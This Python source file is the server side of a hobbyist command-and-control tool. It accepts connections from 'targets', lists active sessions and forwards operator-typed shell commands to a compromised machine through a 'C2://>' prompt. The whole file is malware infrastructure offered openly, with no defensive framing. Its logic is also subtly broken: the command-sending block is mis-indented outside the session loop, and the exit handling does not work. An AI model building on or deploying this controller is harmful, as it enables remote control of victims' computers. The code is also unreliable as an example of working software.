# Main server file, accepts connections and sends commands
import socket
import threading

targets = []
target_ips = []

def accept_connection(server_socket):
    """Continuously accept connection background thread"""
    while True:
        try:
            client_socket, addr = server_socket.accept()
            targets.append(client_socket)
            target_ips.append(addr)
            print(f"Connection established from {addr[0]}")
        except Exception as e:
            print("FAAHHH")
        
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('127.0.0.1', 5555))
    server.listen(5)
    print(f"server listening.. ")

    # Starting the listener thread.
    t = threading.Thread(target=accept_connection, args=(server,))
    t.daemon = True
    t.start()
    while True:
            try:
                    cmd = input("C2://>")
                    if cmd == 'list':
                        print("--Active-session--")
                        for i,ip in enumerate(target_ips):
                            print(f'Enumate: {i}:{ip[0]}')
                    elif cmd.startswith('select'):
                        try:
                            session_id = int(cmd.split()[1])
                            conn = targets[session_id]
                            print(f"[*] Entered Session {session_id}. Type 'exit' to background.")
                            while True:
                                remote_cmd = input(f"Shell({target_ips[session_id][0]})> ")
                                if remote_cmd == 'exit':
                                    break
                            if len(remote_cmd) > 0:
                                conn.send(remote_cmd.encode())
                                response = conn.recv(4096).decode('utf-8')
                                print(response)
                        except:
                                print("Invalid session ID")

                    elif cmd == "exit":
                         print('Session Closing.')
            except KeyboardInterrupt:
                 print("KeyboardInturrupt. closing")

start_server()

                     




    
